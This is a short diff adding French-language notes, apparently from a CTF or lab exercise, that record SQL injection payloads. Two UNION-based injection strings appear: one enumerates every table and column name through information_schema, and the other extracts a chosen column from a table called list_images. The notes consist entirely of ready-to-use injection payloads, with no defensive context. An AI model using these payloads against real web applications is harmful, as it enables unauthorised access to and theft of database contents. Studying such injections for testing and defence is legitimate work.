@@ -1,0 +1,4 @@
+5 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+nous permets d'avoir le nom de toutes les tables et colonnes
+
+1 AND 1=2 UNION SELECT `nom de la colonne`, id FROM list_images
